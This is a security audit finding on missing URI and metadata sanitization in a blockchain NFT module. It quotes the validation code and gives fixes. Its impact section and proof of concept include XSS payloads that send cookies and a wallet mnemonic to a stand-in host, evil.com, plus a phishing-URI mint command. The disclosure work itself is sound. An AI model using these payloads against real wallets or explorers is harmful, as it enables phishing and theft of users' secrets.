### Title
Lack of URI and Metadata Sanitization in NFT Messages Enables On-Chain Phishing Vector - (File: x/nft/types/msgs.go, x/nft/types/validation.go)

---

### Summary

The `x/nft` module accepts arbitrary, unsanitized content in the `Uri`, `Name`, `Data`, and `Schema` fields of `MsgIssueDenom`, `MsgMintNFT`, and `MsgEditNFT`. `MsgIssueDenom.ValidateBasic()` does not call `ValidateTokenURI` on its `Uri` field at all, and `ValidateTokenURI` itself only enforces a length cap with no URL scheme check. The `Name`, `Data`, and `Schema` fields across all three messages are entirely unvalidated. Any unprivileged account can permanently store malicious URIs (e.g., phishing URLs, `javascript:` URIs) and arbitrary HTML/script payloads in on-chain NFT metadata, which NFT explorers and wallets will display to users.

---

### Finding Description

`MsgIssueDenom.ValidateBasic()` validates only the denom ID and sender address, and delegates name validation to `ValidateDenomName`. It never calls `ValidateTokenURI` on the `Uri` field:

```go
// x/nft/types/msgs.go:46-55
func (msg MsgIssueDenom) ValidateBasic() error {
    if err := ValidateDenomID(msg.Id); err != nil {
        return err
    }
    if _, err := sdk.AccAddressFromBech32(msg.Sender); err != nil {
        return newsdkerrors.Wrapf(sdkerrors.ErrInvalidAddress, ...)
    }
    return ValidateDenomName(msg.Name)
    // msg.Uri and msg.Schema are never validated
}
```

By contrast, `MsgMintNFT.ValidateBasic()` and `MsgEditNFT.ValidateBasic()` do call `ValidateTokenURI` on their `URI` fields, but even that function only enforces a 256-character length cap:

```go
// x/nft/types/validation.go:77-82
func ValidateTokenURI(tokenURI string) error {
    if len(tokenURI) > MaxTokenURILen {
        return sdkerrors.Wrapf(ErrInvalidTokenURI, ...)
    }
    return nil  // no scheme check, no character filtering
}
```

`ValidateDenomName` only rejects empty/whitespace strings with no upper length bound and no character filtering:

```go
// x/nft/types/validation.go:57-63
func ValidateDenomName(denomName string) error {
    denomName = strings.TrimSpace(denomName)
    if len(denomName) == 0 {
        return sdkerrors.Wrapf(ErrInvalidDenomName, ...)
    }
    return nil  // no max length, no character set restriction
}
```

The `Name` and `Data` fields in `MsgMintNFT.ValidateBasic()` and `MsgEditNFT.ValidateBasic()` are never validated at all. The `Schema` field in `MsgIssueDenom` is also never validated.

All of these fields are stored verbatim on-chain in `BaseNFT` and `Denom` structs and are returned by query endpoints, making them available to any frontend or wallet that renders NFT metadata.

---

### Impact Explanation

An unprivileged account can issue a denom or mint an NFT with:
- A `Uri` set to a phishing URL (e.g., `https://cronos-airdrop.evil.com`) or a `javascript:` URI — stored with no length bound on the denom URI and no scheme validation on any URI field.
- A `Name` or `Data` field containing HTML/script payloads (e.g., `<script>document.location='https://evil.com?c='+document.cookie</script>`).
- A `Schema` field of arbitrary size and content.

These values appear in NFT explorers and wallets that display NFT metadata. Users who trust the official Cronos chain data have no on-chain signal that a URI or name is malicious. Frontends that do not HTML-encode these fields are directly vulnerable to XSS. Frontends that render URIs as clickable links expose users to phishing.

The corrupted on-chain value is the `Denom.Uri` / `BaseNFT.URI` / `BaseNFT.Name` / `BaseNFT.Data` stored in the NFT module's KV store, permanently associated with a legitimate-looking denom ID.

---

### Likelihood Explanation

The entry path requires only a funded account and a standard `MsgIssueDenom` or `MsgMintNFT` transaction — no special privileges. The denom creator restriction on `MsgMintNFT` means only the denom creator can mint tokens under a given denom, but any account can issue a new denom with a malicious URI. The attack is cheap, permanent, and requires no coordination. NFT explorers and wallets that consume chain data are the natural attack surface.

Impact: 3 / Likelihood: 3

---

### Recommendation

1. **Add URI validation to `MsgIssueDenom.ValidateBasic()`**: call `ValidateTokenURI` (or a dedicated `ValidateDenomURI`) on `msg.Uri`.
2. **Add URL scheme validation to `ValidateTokenURI`**: reject URIs that do not begin with `https://` or `ipfs://` (or another allowlist of safe schemes). Reject `javascript:`, `data:`, and other dangerous schemes.
3. **Add a maximum length cap to `ValidateDenomName`**: enforce an upper bound (e.g., 128 characters) analogous to `MaxTokenURILen`.
4. **Add length and character validation for `Name`, `Data`, and `Schema` fields** in `MsgMintNFT`, `MsgEditNFT`, and `MsgIssueDenom`.
5. Ensure all frontends HTML-encode NFT metadata fields before rendering.

---

### Proof of Concept

```bash
# Any funded account can issue a denom with a phishing URI and no length bound
chain-maind tx nft issue mydenomid \
  --name="Official Cronos NFT Drop" \
  --uri="https://cronos-official-airdrop.evil.com/connect-wallet" \
  --schema='<script>fetch("https://evil.com?k="+localStorage.getItem("mnemonic"))</script>' \
  --from=attacker \
  --chain-id=crypto-org-chain-mainnet-1

# Query returns the malicious URI verbatim — displayed in any NFT explorer
chain-maind query nft denom mydenomid
# Output includes: uri: "https://cronos-official-airdrop.evil.com/connect-wallet"
```
